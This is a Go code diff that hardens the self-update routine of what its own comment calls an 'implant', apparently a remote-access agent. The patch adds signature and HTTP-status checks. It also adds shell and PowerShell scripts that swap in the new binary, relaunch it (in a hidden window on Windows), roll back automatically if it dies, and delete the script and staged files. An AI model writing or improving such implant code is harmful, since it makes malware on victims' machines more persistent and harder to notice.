@@ -84,6 +84,9 @@ func verifyUpdateSignature(pubKeyHex string, hash, sig []byte) bool {
 	if err != nil {
 		return false
 	}
+	if len(pk) != ed25519.PublicKeySize {
+		return false
+	}
 	return ed25519.Verify(ed25519.PublicKey(pk), hash, sig)
 }
 
@@ -154,6 +157,11 @@ func selfUpdate(cmdJSON string) string {
 		os.Remove(tmpPath)
 		return "failed to download update: " + err.Error()
 	}
+	if resp.StatusCode < http.StatusOK || resp.StatusCode >= http.StatusMultipleChoices {
+		out.Close()
+		os.Remove(tmpPath)
+		return fmt.Sprintf("update download returned HTTP %d", resp.StatusCode)
+	}
 	defer resp.Body.Close()
 
 	// Write binary and compute SHA-256 hash simultaneously
@@ -177,19 +185,22 @@ func selfUpdate(cmdJSON string) string {
 		return "signature verification failed: binary may be tampered"
 	}
 
-	// TOCTOU mitigation: re-read the temp file and re-verify immediately
-	// before handing it to the platform updater, so a swap of the temp file
-	// between verification and replacement is detected.
-	if f, rerr := os.Open(tmpPath); rerr == nil {
-		rh := sha256.New()
-		if _, rerr := io.Copy(rh, f); rerr == nil {
-			if !verifyUpdateSignature(verifyKeyHex, rh.Sum(nil), signature) {
-				f.Close()
-				os.Remove(tmpPath)
-				return "signature verification failed after re-check: binary may be tampered"
-			}
-		}
+	// TOCTOU mitigation: re-read and re-verify immediately before replacement.
+	f, rerr := os.Open(tmpPath)
+	if rerr != nil {
+		os.Remove(tmpPath)
+		return "failed to re-open update for verification: " + rerr.Error()
+	}
+	rh := sha256.New()
+	if _, rerr := io.Copy(rh, f); rerr != nil {
 		f.Close()
+		os.Remove(tmpPath)
+		return "failed to re-read update for verification: " + rerr.Error()
+	}
+	f.Close()
+	if !verifyUpdateSignature(verifyKeyHex, rh.Sum(nil), signature) {
+		os.Remove(tmpPath)
+		return "signature verification failed after re-check: binary may be tampered"
 	}
 
 	// Make temp file executable (Linux)
@@ -207,4 +218,77 @@ func selfUpdate(cmdJSON string) string {
 	default:
 		return selfUpdateLinux(exe, tmpPath)
 	}
+}
+
+func shellQuote(value string) string {
+	return "'" + strings.ReplaceAll(value, "'", "'\"'\"'") + "'"
+}
+
+// buildUnixUpdateScript keeps the previous executable until the replacement
+// survives a short health window. A copy failure or early child exit restores
+// the backup and restarts it instead of leaving a dead implant on disk.
+func buildUnixUpdateScript(exe, staged string) string {
+	return fmt.Sprintf(`#!/bin/sh
+sleep 1
+cp -f %[1]s %[3]s || exit 1
+i=0
+until cp -f %[2]s %[1]s; do
+    i=$((i+1))
+    if [ "$i" -ge 10 ]; then
+        cp -f %[3]s %[1]s
+        chmod +x %[1]s
+        exec %[1]s
+    fi
+    sleep 1
+done
+chmod +x %[1]s
+%[1]s >/dev/null 2>&1 &
+pid=$!
+sleep 5
+if kill -0 "$pid" 2>/dev/null; then
+    rm -f %[3]s %[2]s "$0"
+    exit 0
+fi
+wait "$pid" 2>/dev/null
+cp -f %[3]s %[1]s
+chmod +x %[1]s
+exec %[1]s
+`, shellQuote(exe), shellQuote(staged), shellQuote(exe+".prev"))
+}
+
+func buildWindowsUpdateScript(exe, staged string) string {
+	quote := func(value string) string { return "'" + strings.ReplaceAll(value, "'", "''") + "'" }
+	return fmt.Sprintf(`Start-Sleep -Milliseconds 1000
+$exe = %[1]s
+$staged = %[2]s
+$backup = ($exe + '.prev')
+Copy-Item -LiteralPath $exe -Destination $backup -Force
+$copied = $false
+for ($i = 0; $i -lt 20; $i++) {
+    try { Copy-Item -LiteralPath $staged -Destination $exe -Force; $copied = $true; break }
+    catch { Start-Sleep -Milliseconds 250 }
+}
+if (-not $copied) {
+    Copy-Item -LiteralPath $backup -Destination $exe -Force
+    Start-Process -FilePath $exe -WindowStyle Hidden
+    exit 1
+}
+$child = Start-Process -FilePath $exe -WindowStyle Hidden -PassThru
+Start-Sleep -Seconds 5
+if (-not $child.HasExited) {
+    Remove-Item -LiteralPath $backup -Force -ErrorAction SilentlyContinue
+    Remove-Item -LiteralPath $staged -Force -ErrorAction SilentlyContinue
+    exit 0
+}
+Copy-Item -LiteralPath $backup -Destination $exe -Force
+Start-Process -FilePath $exe -WindowStyle Hidden
+exit 1
+`, quote(exe), quote(staged))
+}
+
+func scheduleUpdateExit() {
+	go func() {
+		time.Sleep(2 * time.Second)
+		os.Exit(0)
+	}()
 }
